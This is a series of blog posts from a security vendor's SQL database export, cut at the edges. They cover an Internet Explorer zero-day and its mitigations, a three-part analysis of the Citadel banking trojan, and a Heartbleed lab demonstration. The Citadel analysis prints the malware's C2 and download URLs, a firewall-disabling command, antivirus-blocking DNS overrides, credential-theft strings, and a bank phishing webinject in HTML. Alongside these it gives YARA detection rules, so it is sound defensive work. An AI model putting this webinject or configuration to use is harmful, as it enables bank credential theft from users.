confidential data and how a breach could impact market cap, brand perception and revenue. I hope that more information sharing will ensure our business leaders understand the tie between security and revenue. \nUltimately, I think the information provided in this report should serve as a source for quantitative data points that can be used to have open and candid discussions about security effectiveness, risk metrics and data valuation. If organizations aren’t having the dialogue between IT security pros and the company’s top leadership, they should make the time to have that conversation. There’s a very good chance that it will reduce any ambiguity in expectations around security effectiveness and organizational roles and responsibilities.\nClick here to download the “Exposing the Cybersecurity Cracks: A Global Perspective\" survey.  Below is also an infographic detailing these results (pdf available here).', 'https://www.forcepoint.com/insights/new-global-survey-start-cybersecurity-conversations\n');

Dr. Watson logs), we have identified two possible vulnerabilities (anomalous crashes) in VGX.DLL that may be linked to MSIE 0-day CVE-2014-1776.\n  We have seen a significant spike in crashes of Internet Explorer versions 8 and 9 that fail in VGX.DLL, starting in February 2014. These crashes are indicators of application vulnerabilities that may be exploited.\n  Anomalous application crashes from VGX.DLL have been observed originating from the USA, UK, and Brazil. Specific industries with anomalous application crashes include telecommunications, tier-1 financial and municipal government. \nAs we mentioned in our last blog entry, a new vulnerability has been discovered by researchers at FireEye in Microsoft Internet Explorer affecting Internet Explorer versions 6 through 11. Current reported attacks are targeting only Internet Explorer 9 through 11. The vulnerability allows attackers to remotely execute arbitrary code on the target machine by having the user visit a malicious website. The vulnerability has been assigned reference CVE-2014-1776.  The vulnerability lies in the way Internet Explorer handles Vector Markup Language and vector graphics rendering, when Internet Explorer accesses a related object in memory that has been deleted or improperly allocated. This allows the attacker to execute arbitrary code in the context of the current user.\n\nMicrosoft has released an advisory with recommendations about how users can take steps to mitigate their vulnerability while a patch is prepared. There has been quite a bit of discussion about the impact of the vulnerability, including recommendations from both the US Department of Homeland Security and UK governments that government users avoid the use of Internet Explorer until a bug patch is released by Microsoft.\nIn spite of the ongoing discussions and mitigation options, not many details exist about how the exploit targets Microsoft Internet Explorer, and where it is being seen in the wild. In this blog post, we will examine application crash reports from Microsoft Windows computers that are sent via the WER (Windows Error Reporting) framework, to see if we can learn anything about possible vulnerabilities that are being exploited and/or where attacks are occurring.\nComparison to known exploits\nMicrosoft\'s threat advisory for CVE-2014-1776 recommends disabling the VGX.DLL library as a mitigation option against the exploit. This library is a core library for Internet Explorer\'s \"Vector Markup Language\" (VML) capability -- a deprecated vector graphics format that was primarily used in Microsoft Office Applications. It is interesting to see that VGX.DLL has been linked to other vulnerabilities from 2013, including CVE-2013-2551 and CVE-2013-0030, which both use memory corruption techniques that could theoretically be used to compromise IE. We have previously discussed how Microsoft Windows Error Reporting (WER), a.k.a. Dr. Watson, is an opt-out program that exists in Windows XP, Vista, 7, and 8 that sends detailed telemetry to Microsoft each time an application crashes or fails to update, or a hardware change occurs on the network. This data is incredibly valuable to Microsoft and application vendors, to help debug their applications and prioritize fixes on a massive scale. More information on how you can harness intelligence from Windows crash reports, which are sent from over 80% of PCs globally, can be found in our whitepaper.\n\nToday, we will search crash reports for evidence of exploit-type activity happening in the VGX.DLL library within Internet Explorer. This can be used to help identify possible vulnerabilities that are being exploited by CVE-2014-1776, and can hint at possible geographic locations that are being targeted during attacks. These application crashes are generated for one of three reasons:\n1. Normal application failure, such as running out of memory\n2. Crash triggered during normal application use, which may be a vulnerability\n3. Failed exploit activity\nSearching for needles in the haystack\nLet\'s start by looking at Windows Error Reporting application crashes that we have seen occur in the past 6 months. Out of a total of 19.8 million error reports, the following crashes occurred in Internet Explorer versions 6 - 11 inside the VGX.DLL library\nNovember 2013: 2 crashes\n  December 2013: 1 crash\n  January 2014: 3 crashes\n  February 2014: 13 crashes\n  March 2014: 9 crashes\n  April 2014: 12 crashes\nWe see a significant uptick in crashes starting around February 10th, 2014. Let\'s take a closer look to see if we can learn anything from the crash reports. Of 39 crashes observed, there are 15 distinct crash reports, grouped by the crash offset location. Two distinct crash reports emerge as being interesting.\n\n  Possible vulnerability affecting VGX.DLL in IE 9\nWe have seen the first cluster of application crashes affecting IE version 9 on Windows 7 -- consistent with the vulnerability observed in the wild. We have observed matching crash reports indicating possible failed exploit activity in the United States between March 22nd, 2014, and mid-April 2014.\n4 matches: http://watson.microsoft.com/StageOne/iexplore_exe/9_0_8112_16483/515df825/vgx_dll/9_0_8112_16483/515df802/c0000005/00026fed.htm?\nBuffer Overflow vulnerability affecting VGX.DLL in IE 8\n\nA second interesting cluster of crash reports appears to be affecting IE 8 (via our telemetry).  We can see two distinct versions of IE 8 on Windows 7 affected below (8.0.7601.17514 and 8.0.7600.16385). The BEX error type indicates a buffer overflow happening in VGX.DLL, and it is somewhat unusual to see such a large percentage of application crashes being triggered via buffer overflow. While it has not been reported that IE 8 has been targeted via CVE-2014-1776 in the wild, errors like this are consistent with exploits that corrupt and overwrite memory. We have observed these crash reports occurring as early as February 17, 2014 in the United States, United Kingdom, and Brazil. \n\n000000_0:http://watson.microsoft.com/StageOne/Generic/BEX/iexplore_exe/8_0_7601_17514/4ce79912/vgx_dll_unloaded/0_0_0_0/52745e57/644481aa/c0000005/00000008.htm?\n  000001_0:http://watson.microsoft.com/StageOne/Generic/BEX/iexplore_exe/8_0_7601_17514/4ce79912/vgx_dll_unloaded/0_0_0_0/52745e57/66bda6fa/c0000005/00000008.htm?\n  000001_0:http://watson.microsoft.com/StageOne/Generic/BEX/iexplore_exe/8_0_7601_17514/4ce79912/vgx_dll_unloaded/0_0_0_0/4dba4373/6987f4b4/c0000005/00000008.htm?\n  000002_0:http://watson.microsoft.com/StageOne/Generic/BEX/iexplore_exe/8_0_7601_17514/4ce79912/vgx_dll_unloaded/0_0_0_0/52745e57/6aa5b562/c0000005/00000008.htm?\n  000003_0:http://watson.microsoft.com/StageOne/Generic/BEX/iexplore_exe/8_0_7601_17514/4ce79912/vgx_dll_unloaded/0_0_0_0/52745e57/5e3e8901/c0000005/00000008.htm?\n  000004_0:http://watson.microsoft.com/StageOne/Generic/BEX/iexplore_exe/8_0_7601_17514/4ce79912/vgx_dll_unloaded/0_0_0_0/4dba4373/6987f4b4/c0000005/00000008.htm?\n  000009_0:http://watson.microsoft.com/StageOne/Generic/BEX/IEXPLORE_EXE/8_0_7600_16385/4a5bc69e/vgx_dll_unloaded/0_0_0_0/4a5bdb2c/60dee4f3/c0000005/00000008.htm?\nTo conclude - this analysis is not intended to be conclusive, but to provide indicators of possible vulnerabilities in Internet Explorer\'s VGX.DLL that may be exploited by CVE-2014-1776.

However, current reported attacks are targeting only Internet Explorer 9 through 11. The vulnerability allows attackers to remotely execute arbitrary code on the target machine by having the user visit a malicious website.\n\n\n	This vulnerability has been assigned reference CVE-2014-1776.  The vulnerability lies in the way Internet Explorer handles Vector Markup Language and vector graphics rendering when Internet Explorer accesses a related object in memory which has been deleted or improperly allocated. This allows the attacker to execute arbitrary code in the context of the current user.\n\n\n	The Websense Approach\n\n\n	As with any vulnerability it is always best to apply vendor patches to ensure complete protection from exploit attempts.  In this instance no patch or Fix It is available from Microsoft.\n\n\n	So, what now? The next best thing to do is to protect from the apparatus and delivery mechanisms used by the attackers.  When reports of low volume targeted attacks surface it is often not long before the attacks become more widespread after code targeting the vulnerability is incorporated into exploit kits.\n\n\n	At the time of writing attack samples are sparse so we are exploring the telemetry within our ThreatSeeker® Intelligence Cloud looking for exemplars and Indicators of Compromise. We shall update this blog with additional insights as more become available, but for now it does not look like use of this vulnerability is widespread.\n\n\n	Websense offers protection throughout the attack life cycle using the 7 Stages of Advanced Attacks model.  Typically we see the following scenario in such instances: a user will visit a website (most likely a compromised legitimate website, rather than one specifically registered by an attacker), thus initiating a Flash file download which sets the scene for a further call to a JavaScript payload.  This in turn triggers the vulnerability in Internet Explorer.  Attackers may use the opportunity of remote code execution to launch additional components within a reconnaissance or data theft attack.\n\n\n	In the absence of a patch or Fix It from Microsoft various mitigation techniques are available, including:\n\n\n		Most importantly do not use Administrative account for general tasks such as web-browsing. As the attacker inherits the rights of the current user, using a non-privileged account is highly advisable.\n	\n		Consider deploying Microsoft\'s Enhanced Mitigation Experience Toolkit (EMET v4.1) which is designed to make exploitation more difficult for attackers.\n	\n		Turn on Enhanced Protected Mode (EPM) in Internet Explorer. It is available for IE 10 and 11.\n	\n		Disabling Internet Explorer\'s Flash plugin will render the exploit non-functional.\n	\n		Disabling VML (unregistering vgx.dll) will turn off the vulnerable library.  You should certainly consider this if you are using Windows XP (see note below).\n	\n		For organisation\'s that are flexible on browser choice you should consider adopting an alternative browser to Internet Explorer, at least prior to applying a patch from Microsoft.\n\n	More information about the vulnerability, and how to implement the aforementioned mitigation factors, can be found at Microsoft Security Advisory 2963983.\n\n\n	Further, now Windows XP is no longer supported by Microsoft this discovery leads prompts a timely reminder to consider alternatives to this still popular operating system, to better protect from vulnerabilities affecting Windows XP users.\n\n\n	Websense Security Labs will continue monitoring the situation and update this blog accordingly.', 'https://www.forcepoint.com/blog/security-labs/microsoft-internet-explorer-zero-day-cve-2014-1776\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (268, 'Crimeware based Targeted Attacks: Citadel case, Part III', 'Nicholas GriffinJohn BergbomForcepoint Security La', '\n      \n    \n      \n      \n   ', 'In our previous blog (part 2 in this 3 part series), we outlined how Citadel infects a host machine, and we extracted some string references that we used to detect it via YARA. However, we have yet to really understand how this crimeware works and the risk it poses.\n\nIn this third part, we will dive deeper into the analysis and try to extract Citadel\'s configuration settings, as well as write more solid detection code.\n\nBehavioral Analysis\n\nA good start for our analysis is to look for any suspicious network traffic, so let\'s monitor our system for exactly that:\n\n\n\nWe observe that explorer.exe is communicating with an external server over HTTP! This is definitely suspicious. Let\'s see what was sent and received:\n\n\n\nIt appears that something related to configuration is being downloaded. The filename is declared as \'config.dll\' but there is no PE header in the payload, and we cannot trust what the server is saying. Whatever the content is, there is a good chance it is encrypted.\n\nIn order to see how the payload is handled, we need to debug explorer.exe and set a breakpoint on Winsock\'s send and recv APIs. The idea is to see when the target URL is being requested via send, receive the data with recv, and then set a hardware access breakpoint on the received HTTP payload. We can then run the program and track how the received data is accessed, including memory copies that we will also hardware breakpoint. Using this method, we should eventually end up in the final decryption routine:\n\n\n\nWe can see here that the final decryption routine is a simple XOR that works backward through the data. This subroutine might be a good opportunity for a new YARA rule, but let\'s come back to that later.\n\nWe need to find a reference to the size and the beginning of the decrypted payload so that we can dump it after it is decrypted. A good way to find this information is to start again and set a breakpoint on the decryption routine before it is executed. In this example, the EAX register should start off as the size of the payload, and EAX+ESI should finish as being the beginning of it.\n\nNow that we have the location and size of the decrypted payload in memory, we can go ahead and dump that memory region to file:\n\n\n\nThe configuration file contains a header (marked in red) and then blocks of data (marked in blue) with their own headers and payloads (marked in green). The header of the file contains 20 random characters, followed by the size of the whole file (0x9A64), flags, the amount of blocks in the file (0x7F or 127), and finally an MD5 hash. The block headers have an identifier that describes the payload (0x00004E21 means version), flags (0x10000000 means optional), compressed size (0x04), and raw size (0x04). The block payload then follows, which we see as 0x01030501. This is the version number of the configuration file. We can probably assume then, that we are looking at Citadel version 1.3.5.1.\n\nIf we look further down the file, we can see some unreadable payloads:\n\n\n\nThe start of the block is marked, and we can see that the flags are 0x10000001. The flag 0x01 means that the payload is compressed. We can also see that the compressed size of 0x47 is smaller than the raw size of 0x6B. Citadel/Zbot uses the NRV2B compression algorithm, and we can write a simple tool to loop through all of the blocks to decompress them.\n\nOur tool also outputs each block in a human-readable format. Additionally, Zbot configurations usually declare HTTP injections to conduct on specific webpages, and these are also parsed and formatted correctly. As a result, we see some interesting configuration options (we have replaced http with hxxp to prevent hyperlinks):\n\nLAST VERSION\n    1.3.5.1\n\nLAST VERSION URL\n    hxxp://www.cliponltd.biz/images/start/aboutus/contact/help/support/thanks/file.php|file=soft.exe\n\nURL SERVER\n    hxxp://www.cliponltd.biz/images/start/aboutus/contact/help/support/thanks/gate.php\n\nUKNOWN DEFINITION (SERVERS)\n    hxxp://www.cliponltd.biz/images/start/aboutus/contact/help/support/thanks/file.php\n\nIMPORTED COMMANDS\n    hostname\n    Net view\n    tasklist\n    ipconfig /all\n    netsh firewall set opmode disable\n\nHTTP FILTERS (# = capture, ! = ignore, @ = screen capture)\n    #*wellsfargo.com/*\n    #*mail.yahoo.com/*\n    #*gmail.com/*\n    #*us.hsbc.com/*\n    #*paypal.com/*\n    @*payment.com/*\n    !http://*.com/*.jpg\n\nDNS LIST\n    *antivirus*=209.85.229.104\n    bitdefender.com=209.85.229.104\n    download.bitdefender.com=209.85.229.104\n    ...\n\nThere are definitions here for the bot download URL (LAST VERSION URL), and the data extraction URL (URL SERVER), as well as some HTTP \'filters.\' It is possible to screen record, screen capture, or ignore a website or webpage(s) using these filters. There is also a large DNS list, which is used for overriding the host\'s DNS lookup, presumably to prevent an infected host from being able to visit an antivirus website, or to redirect users to a malicious host.\n\nFurther down the file, we see the list of HTTP injections to perform, including this one:\n\nHTTP INJECTS\n    [FLAGS]\n        0x00003064 (GET|POST|IS_INJECT|URL_CASE_INSENSITIVE|CONTEXT_CASE_INSENSITIVE|)\n    [URL MASK]\n        https://online-*****.******.com/customer.ibc\n    [DATA BEFORE]\n        name=\"Password\"*</tr>\n    [DATA INJECT]\n        </tr>\n        <tr align=\"left\">\n        <td bgcolor=\"#ceefe7\" align=\"left\" valign=\"middle\">\n        <div class=\"entries3\">\n        <b>Memorable word:</b> \n        </div> \n        </td> \n        <td bgcolor=\"#ceefe7\"><img src=\"img/space.gif\" width=\"3\" height=\"30\" border=\"0\"></td> \n        <td bgcolor=\"#ceefe7\"> \n        <div class=\"entries\"> \n        <input type=\"password\" tabindex=\"2\" name=\"UKpass\" size=\"15\" maxlength=\"15\"> \n        </div> \n        </td> \n        <td valign=\"top\" bgcolor = \"#ceefe7\"><img src=\"img/space.gif\" width=\"1\" height=\"40\" border=\"0\"></td> \n        </tr>  \n    [DATA BEFORE]\n        <input tabindex=\"3\"\n    [DATA INJECT]\n         OnClick=\"BLOCKED SCRIPT if  (document.forms[0].UKpass.value.length < 2) { \n        alert(\'Please enter your memorable word\');return false;}\"\n\nA URL is declared, which can contain wildcards for matching any URL path or domain name. There are also flags that specify how to capture data (i.e., GET data and/or POST data). We then have information about what code to look for on the webpage, and the injected code to insert at the location where that code is found.\nIn this example, a popular banking website is affected. The normal webpage has the following fields:\n\n\nThe injected code makes the page appear differently:\n\n\n\nTo an unsuspecting victim, there is nothing too alarming here. The modification looks legitimate, and asking for a customer\'s memorable word is a somewhat believable security measure. However, when the information entered is submitted to the login form, it is captured and sent to the data extraction server.\n\nSo we know how Zbot downloads and uses its configuration file, and this is a key function of the trojan. However, more functionality can be called with remote commands. These remote commands exist within an array of strings that Zbot uses for its core functionality. Another tool of ours can find this array in memory, and then decrypt and dump the strings in C-style formatting. Here are some of the more interesting strings:\n\n/* Turning off the IE phishing filter? */\nchar *string_77     = \"Software\\\\Microsoft\\\\Internet Explorer\\\\PhishingFilter\";\nchar *string_78     = \"Enabled\";\nchar *string_79     = \"EnabledV8\";   \n\n/* Targeting email client data? */ \nchar *string_117    = \"Outlook Express\";\nchar *string_118    = \"account{*}.oeaccount\";\nchar *string_119    = \"Software\\\\Microsoft\\\\Windows Mail\";\nchar *string_120    = \"Software\\\\Microsoft\\\\Windows Live Mail\";\n\n/* Targeting FTP credentials? */\nchar *string_151    = \"SOFTWARE\\\\FlashFXP\\\\3\";\nchar *string_152    = \"datafolder\";\nchar *string_153    = \"*flashfxp*\";\nchar *string_154    = \"FlashFXP\";\nchar *string_155    = \"wcx_ftp.ini\";\nNote: It is not feasible to target these strings with a YARA rule as they remain encrypted until used.\n \nWe can see here that browser, email, and FTP related information is referenced. Due to the nature of the string references, we can assume that sensitive private data is being targeted for extraction.\nAlso in the string dump are the command declarations for the bot:\n/* Bot Commands */\nchar *string_227    = \"os_shutdown\";\nchar *string_228    = \"os_reboot\";\nchar *string_230    = \"bot_uninstall\";\nchar *string_231    = \"bot_update\";\nchar *string_232    = \"bot_transfer\";\nchar *string_235    = \"bot_bc_add\";\nchar *string_236    = \"bot_bc_remove\";\nchar *string_252    = \"user_ftpclients_get\";\nchar *string_253    = \"user_emailclients_get\";\nchar *string_260    = \"info_get_software\";\nchar *string_261    = \"info_get_antivirus\";\nchar *string_262    = \"info_get_firewall\";\nchar *string_263    = \"search_file\";\nchar *string_264    = \"upload_file\";\nchar *string_265    = \"download_file\";\nchar *string_266    = \"ddos_start\";\nchar *string_267    = \"ddos_stop\";\nchar *string_268    = \"webinjects_update\";\nchar *string_271    = \"close_browsers\";\n\nThere are 45 commands in total for this particular Citadel build. Among other things, it can shut down the host\'s OS, update itself, block URLs, involve itself in DDoS attacks, and extract data on demand.\nClearly Citadel has a lot of functionality, and its ability to encrypt and decrypt data on the fly means that relying on a YARA rule that targets a string is weak. The decryption routine we found earlier might be a better target for a more generic detection. Zbot, Citadel, and other variants use this same decryption routine, and it is a solid foundation from which we can write a detection.\nSo here is our new, updated YARA rule:\nrule crime_win_zbot_memory_dev_ws\n  {\n      meta:\n          description = \"ZBot & variants - configuration _unpack routine detection\"\n          author = \"Nick Griffin (Websense)\"\n          yaraexchange = \"No distribution without author\'s consent\"\n          date = \"2014-04\"\n          filetype = \"memory\"\n          md5 = \"4d175203db0f269f9d86d2677ac859cf\"\n          sha1 = \"4b422b48be4beaa44557c452f0920aa1ee0b16cb\"\n       \n      strings:\n          $hex_string = {85 C0 7? ?? 8A 4C 30 FF 30 0C 30 48 7?}\n          $bkrebs = \"Coded by BRIAN KREBS for personal use only.

The intended victims of this attack, detailed in part 1 of this blog, were top personnel in key financial positions. This makes plenty of sense, because decrypting Citadel\'s configuration file and the strings it uses reveals how and what it targets in more detail, including banking information and login credentials. The author of this attack was probably aiming for financial gain above all else.\nFinally, Citadel\'s ability to add and change code on-demand makes it a huge security risk once it has infected a host machine, but disabling it may be as simple as removing the start-up entry from the Windows registry. Additionally, creating a YARA rule for detection is fairly straightforward and should provide a solid foundation for identifying Citadel and Zbot variants in the future. Even if the decryption routine changes, we now have a good understanding of how the trojan works.', 'https://www.forcepoint.com/security-labs/crimeware-based-targeted-attacks-citadel-case-part-iii\n');

We will show how to identify the infection, and extract some useful information during the analysis. In our previous blog we explored how this campaign was launched as a low volume, targeted attack. The personnel targeted were in key financial positions, and as such we assume that financial gain was the biggest motive. \n\'Citadel\' is a variant of the Zeus crimeware toolkit (aka ZBot), and was first witnessed in late 2011 after the leak of the ZBot v2 source code. It is capable of a number of functions including stealing data, controlling the host machine, and performing DDoS attacks. It is important to understand the basis of how the initial infection occurs, before diving deeper into more complicated analysis.\nInfection\nThe first thing we see is that it injects code into other processes. The injected code is ultimately responsible for everything that Citadel does and some basic system monitoring reveals how this occurs:\n\n\n\nWe see how the original file spawns a new process named \'beafy.exe\', a randomly generated name that is dropped in the %APPDATA% folder. The new process then proceeds to inject code into explorer.exe and executes that injected code with CreateRemoteThread. The original file is sometimes deleted while the new process adds an entry to the Windows registry, allowing it to be run every time Windows is started.\n\nCitadel then hooks important APIs in order to perform its tasks. We can figure out which APIs are being hooked by using volatility\'s apihooks tool:\n\n vol.py -f /path/to/vmdump.vmem apihooks -p 620\n\nAnd the output:\n\n\n\nWe can see that a push/ret style hook has been implemented on this API. The purpose of this hook is to intercept any data being sent from Winsock\'s send API, which can then be saved and sent to the bot\'s command and control (C&C) server. This could potentially contain important personally identifiable information (PII).\n\nThe hook is redirecting to code in an unknown module, so we then use volatility\'s malfind tool to find and dump the unknown region. We again specifically target explorer.exe:\n\n vol.py -f /path/to/vmdump.vmem malfind -p 620 -D /path/to/memory/dumps/\n\nOne of these resulting dumps is a module (DLL) file, although analysis revealed that it was obfuscated/mangled and so static analysis was very limited. At this point, it is useful to extract all of the string references in these dumps using the Sysinternals strings tool:\n\n strings -q -o /path/to/memory/dumps/*.dmp > /path/to/memory/dumps/strings.txt\n\nThe strings referenced contain a lot of garbage at first glance. However, some interesting ones include:\n\nbc_remove bc_add config.bin Coded by BRIAN KREBS for personal use only. I love my job & wife. SOFTWARE\\Microsoft\\Tuyxr\n\nAll of these are unique to ZBot and it\'s variants, with the registry key having a randomly generated name.  The \'bc_add\' and \'bc_remove\' strings are typical ZBot commands, although usually they are encrypted. The amusing reference to Brian Krebs is unique to the Citadel variant in particular, and as such we can conclude that this is indeed Citadel. We could also verify this by doing a full memory search of an infected process (ie. explorer.exe, and searching for \'citadel\', which should reveal references to \'citadelhost\'.\n\nBy verifying that these strings do not show up in any clean processes, including a check on a clean explorer.exe, we can safely assume that we are good to create detection for this. So using YARA, we can create a signature to automatically find the reference to the Brian Krebs string:\n\nrule crime_win_citadel_memory_dev_ws\n{\n    meta:\n        description =\"ZBot variant - strings referenced in code injected into other processes, ie. FireFox\"\n        author = \"Nick Griffin (Websense)\"\n        yaraexchange = \"No distribution without author\'s consent\"\n        date = \"2014-04\"\n        filetype = \"memory\"\n        md5 = \"4d175203db0f269f9d86d2677ac859cf\"\n        sha1 = \"4b422b48be4beaa44557c452f0920aa1ee0b16cb\"\n\n    strings:\n        $bkrebs =\"Coded by BRIAN KREBS for personal use only. I love my job & wife.\"\n\n    condition:\n        $bkrebs\n}\n\nGreat! We now have a simple detection for Citadel.\n\nSummary\n\nWe know that Citadel injects code into other processes, and Volatility has shown us some evidence of the malware. We have written a simple YARA rule to detect Citadel, but relying on a string reference is fragile, and we have yet to really dive into this crimeware to understand its true functionality.\n\nIn part III we will look into this malware in greater depth, aiming to understand its configuration and core behaviour.  We shall also present a more robust method of identification.', 'https://www.forcepoint.com/security-labs/crimeware-based-targeted-attacks-citadel-case-part-ii\n');

Often when the term \'targeted attack\' is used, a politically-motivated attack springs to mind, or what we like to call Cyberwarfare - a low volume and state-sponsored targeted attack that in many cases employs generic Remote Access Trojans such as Poison Ivy, ZxShell, XtremeRAT and more.\nWhile Cyberwarfare has indeed been seen as a notable trend, it\'s evident that some actors that spread Crimeware (a term that represents cyber attacks that are financially motivated) also keep up with the trends and have been seen to utilize targeted attacks for financial profit.\n\nWe have been witnessing those trends for years as different financially-motivated actors found the advantages of employing a targeted cyber attack that avoids extended periods of misdetection by staying well below the radar. Since the general volume decreases with targeted attacks, financial data theft is compensated by cherry-picking a selection of targets that represent quality in terms of potential financial returns. Crimeware seen in targeted attacks is evident and seen daily through our ThreatSeeker® Intelligence Cloud where known Crimeware gets utilised by actors in short-lived email-based cyber attack bursts aimed at quality personnel in order to maximize financial data theft. \n\nIn this three-part blog we\'re going to take a look at financially-motivated targeted email attack examples that involve a well-known Crimeware toolkit called \'Citadel\'. We are going to describe in detail the attack method, attack duration, and the targeted personnel profile that allow us to label it as \'targeted\'. In the second and upcoming part of the blog we will examine the financial assets targeted by Citadel in this attack by showing how to decrypt Citadel\'s (Zeus/Zbot) configuration and then look at what the actors were after. Let\'s begin!\n\nCyber attack lure artefacts\n\nThe financially motivated crimeware actor behind this attack utilises low volume email lure bursts and circulates them for very short periods of time (hours). Each time a new attack cycle commences, some of the artefacts of the email change in order to evade detection.  The artefacts used in lure email messages include:\n\nSource email address utilised is free email account (changes in every campaign).\nMasquerading as a company making an order or taking interest in product offerings, prices etc.\nA Zeus based crimeware installer binary repackaged (crypted) to evade AV detection.\nCrimeware installer is attached to the email in a zip file and masquerades as a PDF document.\nTargets organizations with individuals in key positions or individuals that are assumed to have accesses to financial resources.\nLure emails are sent at late night times or early morning so they wait for the targets in their inbox.\nAn email lure example and the attached file:\n\n[Click image to enlarge]\n\n\n\n\nThe artefacts have a dual purpose: to evade detection and to social-engineer the target to execute the malware. Altogether for that particular campaign, our cloud service has seen only 26 emails with that specific attachment (we are aware that certain scatter attacks often utilise different attachments, but in this case no other instances were found that held similar characteristics with a different attachment).\n\nOne of the interesting facts we found was that the attack that utilised the same file was actually separated to two campaigns. The first campaign (campaign \'a\') was seen to include only 4 lure email messages that originated from a free email account on Yahoo (globaltrade@yahoo.com) on the 24th of March; the campaign was targeting rather generic email addresses like info@domain-name or specialprojects@domain-name .The second campaign (campaign \'b\') started a day later and included 22 lure emails from the free email account on Yahoo (vitexinternational@yahoo.com) sent on the night between the 25th-26th of March, and this campaign targeted specific individuals holding specific positions (more on that in the next section about verticals). Both campaigns lasted only a few hours and commenced late at night,UTC time ~22:00 (see detailed images below for campaign details).\n\nThe binary attached with both campaigns was a Citadel variant SHA1: 4b422b48be4beaa44557c452f0920aa1ee0b16cb (for the ThreatScope sandbox report click here). The Virustotal detection rate for the binary is not bad when checked 3 days after the attack, but bear in mind that detection is very important at the actual time when the campaign commences, as the actors repackage (crypting) the binary to evade detection. Here is a Virustotal report of a \'fresh\' repackaged crimeware seen in a campaign lure that we checked with Virustotal very close to the time the campaign was commencing, and here is a the report same binary checked a day later. \n\nCampaign \'a\': commenced on the night of the 24th of March, lasted ~1 hour:\n\n[Click image to enlarge]\n\n\nCampaign \'b\': commenced on the night between the 25th-26th of March, lasted ~4 hours\n\n[Click image to enlarge]\n:\n\nCampaign \'a\' and \'b\' summary view: \n\n[Click image to enlarge]\n\n\nThe lure emails were sent to varying sizes of businesses and also government entities spread across different industries and multiple countries (see campaign details images above). The targeted entities were personnel holding top or key positions that usually hold access to different financial resources, including: managing directors, general managers, supply chain manager, merchandiser and PAs to managing directors.\n\nSummary\n\nIn this blog post we described how cybercrime actors utilize Crimeware through conducting targeted attacks. The attack we described was short-lived with specific artefacts aimed to evade detection and social-engineer targets to run what is in fact a piece of Crimeware from the Zeus/Zbot family called Citadel.\n\nPlease stay tuned as in the next blog post we\'re going to have a deeper look into the Citadel variant delivered in this specific attack. We\'re going to show you how to decrypt the configuration file of Citadel in a step-by-step process to understand better what financial resources the actors behind this attack were after.\n\nEditor’s note: All published links found to be broken, obsolete or otherwise inactive are subsequently removed from existing entries.', 'https://www.forcepoint.com/security-labs/crimeware-based-targeted-attacks-citadel-case-part-i\n');

A Practical Look at the Heartbleed Vulnerability', 'Carl LeonardJohn BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'Following on from our previous Heartbleed post, there have been countless reports on the far-reaching scale of this critical security flaw along with numerous discussions as to what \'exactly\' an attacker can gain from exploiting the vulnerability.\n\nGiven the online and \'connected\' nature of modern society, security and trust are the fundamental requirements of any online transaction in which personal or confidential data is transmitted. All of us, both technical and non-technical, have come to rely on the \'padlock in the address bar\' - an indication that the website is handling our data securely, be that credentials, emails, financial records or status updates, with protection handled by the SSL or TLS protocols. It comes as no surprise that when the very thing that should be protecting us is compromised, in this case a feature within OpenSSL, that the implications can be far and wide.\nContributors: Abel Toro, Jason Hill, Alex Watson\n What does this all mean?\nAs with any organized attack and as described by our 7 Stages of Advanced Threats, target reconnaissance precedes all other stages and, in this case will commence with determining  which sites are (still) vulnerable to this OpenSSL vulnerability. As expected, given the widespread media exposure and severity of this flaw, numerous \'proof-of-concept\' (PoC) scripts have been developed and are widely available thus allowing anyone with a command-line and an internet connection to start probing web-servers. Once a vulnerable site has been located, a threat actor can attempt to exploit the vulnerability, in this case by sending a specially crafted heartbeat packet which, rather than the original intended use, requests a larger than expected response which subsequently reveals up-to an additional 64k of memory. Once received, the threat actor can then attempt to sift through the returned data looking for \'interesting\' items that can be further leveraged, for example, credentials or session IDs which would allow them to gain unauthorized access to the site in question or even, as widely suggested, private cryptography keys which could be used to compromise or impersonate the identity of a trusted site or person.\nIn practice - Obtaining Alice\'s credentials?\nTargeting a specific user may prove impractical for a threat actor, especially on larger \'well-used\' sites. For example, if our threat actor wanted to steal Alice’s login credentials for a specific site they wouldn\'t be able to specifically target \'Alice\' and would have to keep running the exploit over a protracted period in the hope of harvest credentials which may or may not contain \'Alice\'s\'. On the other hand, if the target site was smaller, less frequented or if it was known when Alice was likely to authenticate, the threat actor may have a higher chance of success although they would still need to be in the right place at the right time.\nGiven this, if you\'re thinking of changing your credentials it may be pertinent to ensure that the site is not vulnerable to the exploit.\nGrabbing user names and passwords are relatively easy, private keys are more difficult.\nOur research has shown that getting usernames, passwords and session IDs is quite feasible for an attacker in a real life scenario.  The credentials can be stolen very quickly, without a trace and without much technical expertise.\nHowever, while it is theoretically possible to retrieve the server’s private key using the Heartbleed vulnerability, in the real-world this is much more difficult than the aforementioned compromise of user names and passwords. At the time of writing, we have only seen one known successful PoC which can fully or partially extract the private key which required somewhat perfect conditions (for the threat actor):\nThe exploit must account for the specific OS being targeted, in the case of the most widely available PoC: FreeBSD\n  The threat actor must be the first one to communicate with the server after it is restarted in order for the private key to be in memory\n    (If the server has been running for a while the attack is not feasible and therefore a threat actor make seek to \'cause\' the server to restart)\n  In a many cases the private key can only be partially extracted, given this, it may be necessary for the attack to be replayed numerous times in order to attempt to obtain all of the parts\n  It is suggested that some fairly standard server configurations will make it much more difficult to get the private key - further reducing the chances of success\nAs detailed in our previous post, Websense strongly recommends mitigation actions such as regenerating private keys and revoking/reissuing certificates.\nDemonstration\nIn order to demonstrate this vulnerability in a real-life scenario, Websense Security Labs conducted a brief practical analysis of the vulnerability by exploiting a test web-server in our lab environment.\nHaving scanned our test server and determined that it was vulnerable, it was trivial to start reviewing the returned memory results and arguably took under a minute to harvest credentials and gain access to that user’s account. However, as previously stated we needed to be in the right place at the right time and therefore required our victim to authenticate/interact with the website in order for their credentials to actually be \'in memory\'.\nFurthermore, confirming our earlier statement, so long as the server remained un-patched, it was possible to monitor password changes. This clearly highlights the need to exercise caution when interacting with vulnerable hosts such as in this example:\nUser changes an existing password to ‘secret1234’:\n\n\nWhich is subsequently exposed when exploited:\n\n\n\nThrough the use of session cookies, it is also practical for a threat actor to steal credentials even if the user is never prompted to login. Browsing to a site from an already established session is often common practice for web-based email and social network users:\n\n\nGiven this, is would be wise to avoid even browsing to vulnerable sites and system administrators should invalidate all session cookies. While a WordPress site on a vulnerable platform was used for testing purposes, other vulnerable sites are likely to exhibit similar results, albeit unlikely to be in such as clean and predictable manner. In this scenario we simulated a victim browsing to their favorite site 